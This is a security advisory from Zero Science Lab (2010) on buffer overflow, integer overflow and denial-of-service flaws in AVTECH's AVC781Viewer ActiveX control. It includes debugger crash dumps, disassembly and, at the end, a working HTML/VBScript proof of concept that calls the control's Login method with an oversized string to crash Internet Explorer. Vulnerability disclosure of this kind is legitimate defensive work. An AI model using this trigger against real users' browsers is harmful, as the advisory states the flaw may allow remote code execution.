@@ -1,0 +1,343 @@
+Title: AVTECH Software (AVC781Viewer.dll) ActiveX Multiple Remote Vulnerabilities
+
+
+
+Vendor: AVTECH Software, Inc.
+Product Web Page: http://www.avtech.com
+
+
+Summary: AVTECH Software, a private corporation founded in 1988, is a computer software and
+         hardware manufacturer specializing in providing Windows NT/2K/XP/2K3 products to monitor
+         multi-OS computers and network issues throughout a department or an entire enterprise.
+         Once issues or events occur, AVTECH Software products use today's most advanced alerting
+         technologies to communicate critical and important status information to remote system
+         managers and IT professionals via mobile phones, pagers, PDAs, email, the web and more.
+         Automatic corrective actions can also be taken to immediately resolve issues, run scripts,
+         and shutdown/restart servers or applications.
+
+         AVTECH Software is now the premier worldwide manufacturer of environment monitoring equipment
+         specifically designed to monitor today's advanced computer rooms and data centers. Our Room Alert
+         and TemPageR products are used to monitor environmental conditions in many of the world's most
+         secure data centers and are installed in almost every branch of the US government.
+
+
+Description: AVTECH Software's AVC781Viewer ActiveX Control suffers from multiple remote vulnerabilities
+             such as buffer overflow, integer overflow and denial of service (IE crash). This issue is
+             triggered when an attacker convinces a victim user to visit a malicious website.
+
+             Remote attackers may exploit this issue to execute arbitrary machine code in the context of
+             the affected application, facilitating the remote compromise of affected computers. Failed
+             exploit attempts likely result in browser crashes.
+
+
+Windbg:
+======================================================================================================
+
+(265c.26b4): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00fe46f0 ebx=00000000 ecx=baadf00d edx=0000001f esi=baadf00d edi=0013f030
+eip=10019003 esp=0013ed2c ebp=0013eef4 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
+*** WARNING: Unable to verify checksum for C:\WINDOWS\system32\AVC_AX_724_VIEWER.dll
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for AVC_AX_724_VIEWER.dll - 
+AVC_AX_724_VIEWER+0x19003:
+10019003 837e3c65        cmp     dword ptr [esi+3Ch],65h ds:0023:baadf049=????????
+
+======================================================================================================
+
+
+Version Tested: 1.0.9.4
+
+Platform Used: Microsoft Windows XP Professional Service Pack 3 (English)
+               Microsoft Internet Explorer 8.0.6001.18702
+
+
+Vulnerability Discovered By: Gjoko 'LiquidWorm' Krstic - liquidworm gmail com
+			     Macedonian Information Security Research And Development Laboratory			     
+			     Zero Science Lab - http://www.zeroscience.mk
+
+
+Date: 18.04.2010
+
+
+Advisory ID: ZSL-2010-4934
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2010-4934.php
+
+
+
+######################################## Internal Details ############################################
+
+Vulnerabity type:
+
+ - Buffer Overflow
+ - Integer Overflow
+ - Denial Of Service
+
+
+Vulnerable library: AVC781Viewer
+
+Vulnerable class: CV781Object
+
+Vulnerable members: 
+
+ - SendCommand
+ - Login
+ - Snapshot
+ - _DownloadPBOpen
+ - _DownloadPBOpen2
+ - _DownloadPBClose
+ - _DownloadPBControl
+
+
+File location: C:\WINDOWS\system32\AVC_AX_724_VIEWER.dll
+ProgID: AVC781Viewer.CV781Object
+CLSID: 8214B72E-B0CD-466E-A44D-1D54D926038D
+Version: 1.0.9.4
+RegKey Safe for Script: False
+RegKey Safe for Init: False
+Implements IObjectSafety: True
+IDisp Safe:  Safe for untrusted: caller,data  
+IPersist Safe:  Safe for untrusted: caller,data  
+IPStorage Safe:  Safe for untrusted: caller,data
+
+
+CompanyName		AVTECH
+FileDescription		SOFTWARE
+FileVersion		1.0.9.4
+InternalName		AVC781Viewer.dll
+LegalCopyright		AVTECH. All rights reserved.
+OriginalFileName	AVC781Viewer.dll
+ProductName		SOFTWARE
+ProductVersion		1.0.9.4
+
+
+Exception codes (AVC_AX_724_VIEWER.dll):
+======================================================================================================
+
+ACCESS_VIOLATION
+Disasm: 10019003 CMP DWORD PTR [ESI+3C],65
+=====
+ACCESS_VIOLATION
+Disasm: 1001906F MOV EAX,[ECX+48]
+=====
+ACCESS_VIOLATION
+Disasm: 10006C23 MOV [EAX],CL
+=====
+ACCESS_VIOLATION
+Disasm: 10007163 MOV [EAX],CL
+=====
+ACCESS_VIOLATION
+Disasm: 10008437 MOV DWORD PTR [EAX+B58],1
+=====
+ACCESS_VIOLATION
+Disasm: 10001DDB MOV ECX,[EAX+31C]
+=====
+ACCESS_VIOLATION
+Disasm: 10001E34 MOV EAX,[EAX+31C]
+=====
+ACCESS_VIOLATION
+Disasm: 10008867 MOV DWORD PTR [EAX+B58],1
+=====
+
+
+
+Two random exception details:
+======================================================================================================
+======================================================================================================
+
+
+Exception Code: ACCESS_VIOLATION
+Disasm: 10019003	CMP DWORD PTR [ESI+3C],65	(AVC_AX_724_VIEWER.dll)
+
+Seh Chain:
+--------------------------------------------------
+1 	10023363 	AVC_AX_724_VIEWER.dll
+2 	FC2950 	VBSCRIPT.dll
+3 	7C839AC0 	KERNEL32.dll
+
+
+Called From                   Returns To                    
+--------------------------------------------------
+AVC_AX_724_VIEWER.10019003    VBSCRIPT.F73E27               
+VBSCRIPT.F73E27               VBSCRIPT.F73397               
+VBSCRIPT.F73397               VBSCRIPT.F73D88               
+VBSCRIPT.F73D88               VBSCRIPT.F7409F               
+VBSCRIPT.F7409F               VBSCRIPT.F763EE               
+VBSCRIPT.F763EE               VBSCRIPT.F76373               
+VBSCRIPT.F76373               VBSCRIPT.F76BA5               
+VBSCRIPT.F76BA5               VBSCRIPT.F76D9D               
+VBSCRIPT.F76D9D               VBSCRIPT.F75103               
+VBSCRIPT.F75103               SCROBJ.5CE44396               
+SCROBJ.5CE44396               SCROBJ.5CE4480B               
+SCROBJ.5CE4480B               SCROBJ.5CE446A6               
+SCROBJ.5CE446A6               SCROBJ.5CE44643               
+SCROBJ.5CE44643               SCROBJ.5CE44608               
+SCROBJ.5CE44608               1013C93                       
+1013C93                       1006B0C                       
+1006B0C                       100332C                       
+100332C                       1003105                       
+1003105                       1003076                       
+1003076                       1002F16                       
+1002F16                       KERNEL32.7C817067             
+
+
+Registers:
+--------------------------------------------------
+EIP 10019003 -> 10044530 -> Asc: 0E0E
+EAX 00FE4658 -> 10044530 -> Asc: 0E0E
+EBX 00000000
+ECX BAADF00D
+EDX 0000001F
+EDI 0013F030 -> 0047DE68
+ESI BAADF00D
+EBP 0013EEF4 -> 0013EF30
+ESP 0013ED2C -> 00000000
+
+
+Block Disassembly: 
+--------------------------------------------------
+10018FFC	INT3
+10018FFD	INT3
+10018FFE	INT3
+10018FFF	INT3
+10019000	PUSH ESI
+10019001	MOV ESI,ECX
+10019003	CMP DWORD PTR [ESI+3C],65	  <--- CRASH
+10019007	JNZ SHORT 10019030
+10019009	MOV ECX,[ESI+10]
+1001900C	TEST ECX,ECX
+1001900E	JE SHORT 10019017
+10019010	PUSH 66
+10019012	CALL 1001B630
+10019017	MOV EAX,[ESI+48]
+1001901A	MOV ECX,[EAX]
+
+
+ArgDump:
+--------------------------------------------------
+EBP+8	0047AAF0 -> 00000005
+EBP+12	00FE4658 -> 10044530 -> Asc: 0E0E
+EBP+16	00000001
+EBP+20	00F71A2C -> 00000000
+EBP+24	00000409
+EBP+28	00000001
+
+
+Stack Dump:
+--------------------------------------------------
+13ED2C 00 00 00 00 20 F4 00 10 30 F0 13 00 00 00 00 00  [................]
+13ED3C F4 EE 13 00 00 00 00 00 BB 01 91 7C 08 00 00 00  [................]
+13ED4C 40 00 00 00 30 00 00 00 08 D8 47 00 07 00 00 00  [..........G.....]
+13ED5C 10 00 00 00 00 00 00 00 00 00 00 00 FA 00 00 00  [................]
+13ED6C F8 D5 47 00 00 00 00 00 00 00 00 00 68 01 47 00  [..G.........h.G.] 
+
+
+======================================================================================================
+======================================================================================================
+
+
+Exception Code: ACCESS_VIOLATION
+Disasm: 10006C23	MOV [EAX],CL	(AVC_AX_724_VIEWER.dll)
+
+Seh Chain:
+--------------------------------------------------
+1 	10022F68 	AVC_AX_724_VIEWER.dll
+2 	FC2950 	VBSCRIPT.dll
+3 	7C839AC0 	KERNEL32.dll
+
+
+Called From                   Returns To                    
+--------------------------------------------------
+AVC_AX_724_VIEWER.10006C23    AVC_AX_724_VIEWER.10044508    
+AVC_AX_724_VIEWER.10044508    AVC_AX_724_VIEWER.100097B0    
+AVC_AX_724_VIEWER.100097B0    8244C8B                       
+
+
+Registers:
+--------------------------------------------------
+EIP 10006C23
+EAX BAADF06D
+EBX 00180724 -> Uni: defaultV
+ECX 0013EE41 -> 24001827 -> Uni: '$'$
+EDX 00182801 -> Asc: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+EDI 001827BC -> Uni: defaultV
+ESI 00180724 -> Uni: defaultV
+EBP 00FE4658 -> 10044530 -> Asc: 0E0E
+ESP 0013EE40 -> 001827BC
+
+
+Block Disassembly: 
+--------------------------------------------------
+10006C12	MOV EAX,[EBP+144]
+10006C18	ADD EAX,60
+10006C1B	JMP SHORT 10006C20
+10006C1D	LEA ECX,[ECX]
+10006C20	MOV CL,[EDX]
+10006C22	INC EDX
+10006C23	MOV [EAX],CL	  <--- CRASH
+10006C25	INC EAX
+10006C26	TEST CL,CL
+10006C28	JNZ SHORT 10006C20
+10006C2A	MOV EAX,[ESP+20]
+10006C2E	ADD EAX,-10
+10006C31	LEA ECX,[EAX+C]
+10006C34	OR EDX,FFFFFFFF
+10006C37	LOCK XADD [ECX],EDX
+
+
+ArgDump:
+--------------------------------------------------
+EBP+8	00FE4658 -> 10044530 -> Asc: 0E0E
+EBP+12	001862FC -> Uni: AAAAAAAAAAAAAAAAAAAAAAAAA
+EBP+16	0018AB44 -> Uni: defaultV
+EBP+20	00180A54 -> Uni: defaultV
+EBP+24	00000001
+EBP+28	00000001
+
+
+Stack Dump:
+--------------------------------------------------
+13EE40 BC 27 18 00 24 07 18 00 F4 EE 13 00 74 1F 18 00  [............t...]
+13EE50 AC F1 13 00 68 2F 02 10 FF FF FF FF B7 9B 00 10  [....h...........]
+13EE60 00 28 18 00 74 1F 18 00 BC 27 18 00 24 07 18 00  [....t...........]
+13EE70 5C 07 18 00 F4 EE 13 00 00 00 00 00 D8 DD 47 00  [\.............G.]
+13EE80 58 46 FE 00 08 00 00 00 08 00 13 00 44 4A 12 77  [XF..........DJ.w]
+
+
+======================================================================================================
+======================================================================================================
+
+
+
+
+Proof Of Concept:
+######################################################################################################
+
+<object classid='clsid:8214B72E-B0CD-466E-A44D-1D54D926038D' id='kungfuhustle' />
+<script language='vbscript'>
+
+
+targetFile = "C:\WINDOWS\system32\AVC_AX_724_VIEWER.dll"
+prototype  = "Sub Login (
+                        
+                         ByVal Username As String,
+                         ByVal Password As String,
+                         ByVal MediaType As String,
+                         ByVal ConnectType As String
+
+                        )"
+memberName = "Login"
+progid     = "AVC781Viewer.CV781Object"
+argCount   = 4
+
+arg1=String(1010, "A")
+arg2="defaultV"
+arg3="defaultV"
+arg4="defaultV"
+
+kungfuhustle.Login arg1 ,arg2 ,arg3 ,arg4
+
+</script>
+
+######################################################################################################
